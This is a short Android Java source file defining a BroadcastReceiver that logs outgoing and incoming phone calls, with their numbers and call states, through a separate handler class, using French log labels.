package mg.broadcast.hook;

import android.app.*;
import android.content.*;
import android.telephony.*;
import android.util.*;
import android.widget.*;
import mg.broadcast.hook.handler.*;

public class CallReceiver extends BroadcastReceiver{

	@Override
	public void onReceive(Context context,Intent intent){
		CallHandler handler=new CallHandler(context);
		
		if(intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
			String number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			handler.save("Appel sortant: "+number,true,number.contains("#"));
		}
		else{
			TelephonyManager tm=(TelephonyManager)context.getSystemService(Service.TELEPHONY_SERVICE);
			String number=intent.getStringExtra("incoming_number");
			
			switch(tm.getCallState()){
				case TelephonyManager.CALL_STATE_RINGING:{
					if(number!=null)
						handler.save(" -- sonnerie",false,false);
					break;
				}
				case TelephonyManager.CALL_STATE_OFFHOOK:{
					if(number!=null)
						handler.save(" -- accepte",false,false);
					break;
				}
				case TelephonyManager.CALL_STATE_IDLE:{
					if(number!=null)
						handler.save("Appel entrant: "+number,true,false);
					else
						handler.save(" -- termine",true,true);
				}
			}
		}
	}
}
